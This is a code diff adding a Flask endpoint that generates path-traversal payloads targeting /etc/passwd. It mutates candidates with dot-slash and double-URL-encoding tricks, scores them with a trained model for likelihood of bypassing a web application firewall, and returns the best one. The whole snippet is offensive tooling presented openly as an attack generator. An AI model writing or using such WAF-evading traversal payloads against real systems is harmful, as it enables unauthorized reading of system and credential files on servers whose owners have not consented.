@@ -1,0 +1,35 @@
+@app.route('/generate_attack', methods=['GET'])
+def generate_attack():
+    global model, tfidf
+    target_path = "/etc/passwd"
+    
+    # If the model isn't trained yet, stay random
+    if model is None:
+        technique = random.choice(encodings)
+        return jsonify({"technique": "initial_random", "payload": f"../{target_path}"})
+
+    # 1. Generate 50 "Mutated" candidates
+    candidates = []
+    for _ in range(50):
+        tech = random.choice(encodings)
+        # Apply mutation (e.g., adding random dots, slashes, or encodings)
+        p = f"....//....//....//{target_path}" if tech == "none" else f"..%252f..%252f{target_path}"
+        candidates.append({"payload": p, "technique": tech})
+
+    # 2. Ask the Brain to predict success for all 50
+    payload_strings = [c['payload'] for c in candidates]
+    vectors = tfidf.transform(payload_strings).toarray()
+    
+    # Add dummy WAF/Latency features for the prediction
+    meta_features = np.tile([0, np.log1p(500)], (50, 1)) 
+    X_test = np.hstack((vectors, meta_features))
+    
+    # Get probability of SUCCESS (Label 1)
+    probs = model.predict_proba(X_test)[:, 1] 
+    
+    # 3. Pick the best one (Exploitation) or a random "weird" one (Exploration)
+    best_index = np.argmax(probs)
+    winner = candidates[best_index]
+
+    print(f"[AI DECISION] Chose {winner['technique']} | Confidence of bypass: {probs[best_index]:.2%}")
+    return jsonify(winner)
